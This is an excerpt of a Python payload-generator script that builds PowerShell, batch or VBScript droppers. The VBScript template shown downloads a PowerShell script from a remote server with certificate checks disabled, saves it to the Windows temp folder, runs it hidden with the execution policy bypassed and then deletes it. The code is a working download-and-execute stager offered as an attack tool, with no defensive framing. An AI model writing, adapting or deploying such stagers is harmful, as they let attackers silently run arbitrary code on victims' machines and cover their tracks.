...
def generate_vbs_with_encoded_ps1(server_url, output_file):
    # Updated VBS script using WinHttpRequest.5.1 to ignore SSL certificate errors
    vbs_content = f"""
Dim objWinHttp
Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
objWinHttp.Open "GET", "{server_url}", False
objWinHttp.Option(4) = 13056 ' Ignore certificate errors
objWinHttp.Send

If objWinHttp.Status = 200 Then
    Dim ps1Command
    ps1Command = objWinHttp.ResponseText

    ' Save the PowerShell script to a .txt file
    Dim objFSO, txtFile, ps1File
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    txtFile = "C:\Windows\Temp\ps1Command.txt"
    Set objFile = objFSO.CreateTextFile(txtFile, True)
    objFile.Write ps1Command
    objFile.Close

    ' Rename the file to .ps1
    ps1File = "C:\Windows\Temp\ps1Command.ps1"
    objFSO.MoveFile txtFile, ps1File

    ' Execute the PS1 script
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -File " & ps1File, 0, True

    ' Delete the PS1 file after execution
    objFSO.DeleteFile ps1File, True
End If
...
if __name__ == "__main__":
    ...
    parser.add_argument("-type", type=str, choices=["ps1", "bat", "vbs"], required=True, help="Type of payload to generate (ps1/bat/vbs)")
    parser.add_argument("-server", type=str, help="Server URL to download PS1 script from (for BAT/VBS file)")

    args = parser.parse_args()

    if args.type in ["bat", "vbs"] and not args.server:
    ...
    if args.type == "ps1":
        ...
        # Generate the VBS file to download and execute the PS1 file
